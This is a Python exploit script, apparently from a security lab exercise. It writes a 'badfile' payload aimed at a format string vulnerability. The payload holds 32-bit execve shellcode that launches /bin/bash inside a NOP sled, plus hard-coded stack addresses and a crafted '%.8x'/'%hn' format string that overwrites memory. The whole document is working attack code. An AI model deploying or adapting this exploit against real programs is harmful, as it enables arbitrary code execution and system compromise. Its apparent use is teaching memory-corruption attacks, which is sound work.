#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
	"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   	"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
    	"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   	"/bin/bash\*"
   	"-c\*"
).encode('latin-1')



N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = N - len(shellcode)             # Change this number
content[start:] = shellcode

############################################################
#
#    ## Initialize the content array

# Initialize the content array

# Split into 2 byte shorter numbers
number1  = 0xffffd6fe # lower bytes
number2 = 0xffffd6fc #upper bytes
content[0:4]  =  (number1).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12]  =  (number2).to_bytes(4,byteorder='little')
# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
count = 68
D1 = 0xd9d0  - 8 *count -12
D2 = 0xffff - 0xed54 
s = ("%.8x"*count) + "%."+ str(D1) + "x" +"%hn" + "%."+ str(D2) + "x" +"%hn" + "\n"
# + "%x."*30 "%."+ str(10)+ "x"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# 
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
